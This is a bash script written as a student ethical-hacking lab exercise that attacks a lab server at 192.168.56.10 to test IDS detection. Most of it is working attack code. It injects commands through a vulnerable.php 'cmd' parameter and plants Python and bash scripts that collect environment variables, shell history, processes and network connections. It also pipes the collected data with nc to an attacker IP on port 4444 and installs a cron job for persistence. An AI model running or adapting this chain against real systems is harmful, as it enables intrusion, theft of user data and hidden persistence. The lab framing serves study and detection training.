#!/bin/bash

# Ethical Hacking Lab - Keylogger Attack Script
# Task 3: Perform a keylogger attack (10%)
# Target: 192.168.56.10 (Victim Server)
# Author: Student Lab Exercise

echo "=============================================="
echo "⌨️  ETHICAL HACKING LAB - KEYLOGGER ATTACK"
echo "=============================================="
echo "Target Server: 192.168.56.10"
echo "Attack Type: Keylogger Deployment via Command Injection"
echo "Attacker (This machine): $(hostname -I)"
echo "Start Time: $(date)"
echo "=============================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

TARGET="192.168.56.10"
VULN_URL="http://$TARGET/vulnerable.php"

# Function to pause and wait for user input
pause_for_monitoring() {
    echo -e "${YELLOW}⏸️  PAUSE: Check your IDS alerts now! Press Enter to continue...${NC}"
    read -p ""
}

echo -e "${BLUE}📍 Phase 1: Keylogger Deployment Preparation${NC}"
echo "----------------------------------------------"

echo "⌨️ Step 1.1: Check Target System Capabilities"
echo "Checking if target has required tools for keylogger..."
curl -s "$VULN_URL?cmd=which python3"
curl -s "$VULN_URL?cmd=which bash"
curl -s "$VULN_URL?cmd=which nc"
curl -s "$VULN_URL?cmd=ls -la /tmp"
pause_for_monitoring

echo -e "${BLUE}📍 Phase 2: Simple Keylogger Creation${NC}"
echo "----------------------------------------------"

echo "⌨️ Step 2.1: Create Python-based Keylogger"
KEYLOGGER_CODE='import time
import subprocess
import os

def simple_keylogger():
    log_file = "/tmp/keylog.txt"
    try:
        with open(log_file, "a") as f:
            f.write(f"\\n=== Keylogger started at {time.ctime()} ===\\n")
            # Simulate capturing some system information instead of actual keystrokes
            f.write(f"User: {os.getenv(\"USER\", \"unknown\")}\\n")
            f.write(f"PWD: {os.getcwd()}\\n")
            f.write(f"Environment: {str(dict(os.environ))[:200]}...\\n")
            
            # Capture recent bash history (simulated keystroke logging)
            try:
                history = subprocess.check_output("history | tail -10", shell=True, text=True)
                f.write(f"Recent commands (simulated keystrokes):\\n{history}\\n")
            except:
                f.write("Could not capture command history\\n")
            
            f.write("=== Keylogger session end ===\\n")
    except Exception as e:
        pass

simple_keylogger()'

echo "Deploying keylogger code to target system..."
echo "$KEYLOGGER_CODE" | python3 -c "
import urllib.parse
code = input()
encoded = urllib.parse.quote(code)
print('curl -s \"$VULN_URL?cmd=python3 -c \\\"' + encoded + '\\\"\"')
" | bash

pause_for_monitoring

echo "⌨️ Step 2.2: Alternative Bash-based Keylogger"
echo "Creating bash-based monitoring script..."
BASH_KEYLOGGER='#!/bin/bash
LOG_FILE="/tmp/keylog_bash.txt"
echo "=== Bash Keylogger Started $(date) ===" >> $LOG_FILE
echo "User: $(whoami)" >> $LOG_FILE
echo "TTY: $(tty)" >> $LOG_FILE
echo "Processes:" >> $LOG_FILE
ps aux | grep -E "(ssh|bash|apache)" >> $LOG_FILE
echo "Network connections:" >> $LOG_FILE
ss -tuln >> $LOG_FILE
echo "=== End Session ===" >> $LOG_FILE'

curl -s "$VULN_URL?cmd=echo '$BASH_KEYLOGGER' > /tmp/keylogger.sh"
curl -s "$VULN_URL?cmd=chmod +x /tmp/keylogger.sh"
curl -s "$VULN_URL?cmd=/tmp/keylogger.sh"
pause_for_monitoring

echo -e "${BLUE}📍 Phase 3: Keylogger Execution and Data Collection${NC}"
echo "----------------------------------------------"

echo "⌨️ Step 3.1: Execute Keylogger Background Process"
echo "Starting keylogger in background..."
curl -s "$VULN_URL?cmd=nohup python3 -c '$KEYLOGGER_CODE' &"
sleep 2

echo "⌨️ Step 3.2: Generate Some Activity to Log"
echo "Simulating user activity to capture..."
curl -s "$VULN_URL?cmd=whoami"
curl -s "$VULN_URL?cmd=pwd"  
curl -s "$VULN_URL?cmd=ls -la"
curl -s "$VULN_URL?cmd=ps aux | head -10"
sleep 3
pause_for_monitoring

echo "⌨️ Step 3.3: Check Keylogger Output"
echo "Retrieving captured data..."
echo "=== Python Keylogger Output ==="
curl -s "$VULN_URL?cmd=cat /tmp/keylog.txt"
echo ""
echo "=== Bash Keylogger Output ==="
curl -s "$VULN_URL?cmd=cat /tmp/keylog_bash.txt"
pause_for_monitoring

echo -e "${BLUE}📍 Phase 4: Advanced Keylogger Features${NC}"
echo "----------------------------------------------"

echo "⌨️ Step 4.1: Network-based Keylogger (Data Exfiltration)"
echo "Creating network keylogger that sends data to attacker..."
NETWORK_KEYLOGGER='#!/bin/bash
ATTACKER_IP="192.168.56.12"
ATTACKER_PORT="4444"
LOG_DATA="KEYLOG_DATA:$(date):$(whoami):$(pwd):$(history | tail -5)"
echo "$LOG_DATA" | nc $ATTACKER_IP $ATTACKER_PORT 2>/dev/null || echo "Network send failed"'

curl -s "$VULN_URL?cmd=echo '$NETWORK_KEYLOGGER' > /tmp/net_keylogger.sh"
curl -s "$VULN_URL?cmd=chmod +x /tmp/net_keylogger.sh"

echo "Setting up listener on attacker machine (this would be on Kali)..."
echo "Command to run on Kali: nc -lvnp 4444"
echo ""
echo "Executing network keylogger..."
curl -s "$VULN_URL?cmd=/tmp/net_keylogger.sh"
pause_for_monitoring

echo "⌨️ Step 4.2: Persistence - Cron-based Keylogger"
echo "Attempting to establish persistent keylogger..."
curl -s "$VULN_URL?cmd=echo '*/5 * * * * /tmp/keylogger.sh' > /tmp/cron_job.txt"
curl -s "$VULN_URL?cmd=crontab /tmp/cron_job.txt 2>/dev/null || echo 'Crontab failed - permissions'"
curl -s "$VULN_URL?cmd=crontab -l"
pause_for_monitoring

echo -e "${BLUE}📍 Phase 5: Keylogger Detection and Cleanup${NC}"
echo "----------------------------------------------"

echo "⌨️ Step 5.1: Show Keylogger Files Created"
echo "Listing all keylogger artifacts..."
curl -s "$VULN_URL?cmd=ls -la /tmp/key* /tmp/*log*"
curl -s "$VULN_URL?cmd=ps aux | grep -E '(python|keylog|nc)'"
pause_for_monitoring

echo "⌨️ Step 5.2: Keylogger Data Summary"
echo "Final data collection summary..."
echo "=== All Captured Data ==="
curl -s "$VULN_URL?cmd=cat /tmp/keylog.txt /tmp/keylog_bash.txt 2>/dev/null | tail -20"
echo ""
echo "=== File Sizes ==="
curl -s "$VULN_URL?cmd=ls -lh /tmp/key* /tmp/*log* 2>/dev/null"
pause_for_monitoring

echo "⌨️ Step 5.3: Cleanup (Optional - for lab purposes)"
echo "Removing keylogger artifacts..."
read -p "Do you want to clean up keylogger files? (y/n): " cleanup
if [[ $cleanup == "y" || $cleanup == "Y" ]]; then
    curl -s "$VULN_URL?cmd=rm -f /tmp/keylog* /tmp/net_keylogger.sh"
    curl -s "$VULN_URL?cmd=crontab -r 2>/dev/null"
    curl -s "$VULN_URL?cmd=pkill -f keylogger"
    echo "Cleanup completed."
fi

echo "=============================================="
echo -e "${GREEN}✅ KEYLOGGER ATTACK COMPLETE${NC}"
echo "=============================================="
echo "End Time: $(date)"
echo ""
echo -e "${YELLOW}📋 ATTACK SUMMARY:${NC}"
echo "• Deployed Python-based keylogger"
echo "• Created Bash monitoring script" 
echo "• Demonstrated network data exfiltration"
echo "• Attempted persistence via cron jobs"
echo "• Captured user activity and system information"
echo ""
echo -e "${YELLOW}📋 FILES CREATED ON TARGET:${NC}"
echo "• /tmp/keylog.txt - Python keylogger output"
echo "• /tmp/keylog_bash.txt - Bash keylogger output"
echo "• /tmp/keylogger.sh - Bash keylogger script"
echo "• /tmp/net_keylogger.sh - Network exfiltration script"
echo ""
echo -e "${YELLOW}📋 IDS DETECTION ANALYSIS:${NC}"
echo "Check Snort alerts for:"
echo "• Command injection patterns"
echo "• File creation activities"
echo "• Network connection attempts"
echo "• Suspicious process execution"
echo ""
echo -e "${RED}⚠️  REMINDER: This demonstrates educational keylogging concepts!${NC}"
echo "=============================================="
